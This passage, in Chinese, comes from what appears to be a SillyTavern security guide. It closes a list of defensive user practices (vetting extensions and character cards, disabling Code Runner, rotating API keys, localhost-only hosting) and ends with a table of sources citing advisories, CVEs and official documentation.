3. **不安装来源不明的扩展**：优先使用 ST GitHub 组织（`SillyTavern/`）下的官方扩展
4. **导入角色卡前审查**：用 `tavern_card_tools` 打印 PNG 内 JSON，重点检查 `data.extensions.regex` 字段（内嵌正则脚本）；对包含大量 HTML 的世界书条目保持谨慎
5. **不启用 Code Runner 扩展**：除非完全信任对话中出现的所有代码块（来源可信、内容可读）
6. **定期轮换 API Key**：使用服务商的 spending limit / 额度上限，降低泄露损失
7. **只在 localhost 运行 ST**：不暴露到公网；若必须远程访问，使用 VPN 或 SSH tunnel 而非直接端口映射

来源：综合 ST 官方文档 + 安全公告 + 社区实战
适用版本：ST 1.x
**置信度：medium · [文档·多源 + 推断]**

---

## 14. 来源汇总

| 类别 | 来源 | URL |
|---|---|---|
| 真实安全事件（Bot Browser） | ST 官方 GitHub Discussion #5592 | https://github.com/SillyTavern/SillyTavern/discussions/5592 |
| DNS 重绑定安全公告 | ST Security Advisory | https://github.com/SillyTavern/SillyTavern/security/advisories/GHSA-7cxj-w27x-x78q |
| CVE-2025-59159 详情 | securityonline.info | https://securityonline.info/critical-flaw-cve-2025-59159-cvss-9-7-in-sillytavern-allows-full-remote-control-of-local-ai-instances/ |
| CVE-2024-47875（DOMPurify mXSS） | cve.news | https://www.cve.news/cve-2024-47875/ |
| CVE-2025-26791（DOMPurify SAFE_FOR_TEMPLATES） | Snyk | https://security.snyk.io/vuln/SNYK-JS-DOMPURIFY-8722251 |
| DOMPurify 配置误用分析 | mizu.re | https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations |
| PortSwigger mXSS 研究 | PortSwigger Research | https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss |
| ST 扩展开发安全规范 | ST 官方文档 | https://docs.sillytavern.app/for-contributors/writing-extensions/ |
| STScript 安全文档 | ST 官方文档 | https://docs.sillytavern.app/usage/st-script/ |
| ST 正则扩展文档 | ST 官方文档 | https://docs.sillytavern.app/extensions/regex/ |
| Code Runner 扩展 | GitHub | https://github.com/SillyTavern/Extension-CodeRunner |
| CCv3 角色卡规范 | GitHub | https://github.com/kwaroran/character-card-spec-v3 |
| 角色卡检查工具 | GitHub | https://github.com/Barafu/tavern_card_tools |
| 本地生产卡源码（control_center.js） | 运行时源码 | `ST开发指南DB\本地证据\星月历史\2.9.1\components\control_center.js` |
| 本地生产卡源码（status_bar_regex.html） | 运行时源码 | `ST开发指南DB\本地证据\星月历史\2.9.1\components\status_bar_regex.html` |
| 本地生产卡源码（omni_safe_block_renderer.js） | 运行时源码 | `<local-user-path>/OneDrive\ST-\角色卡工作区\交错宙域\v1.9.3_20260526_002904\components\omni_safe_block_renderer.js` |
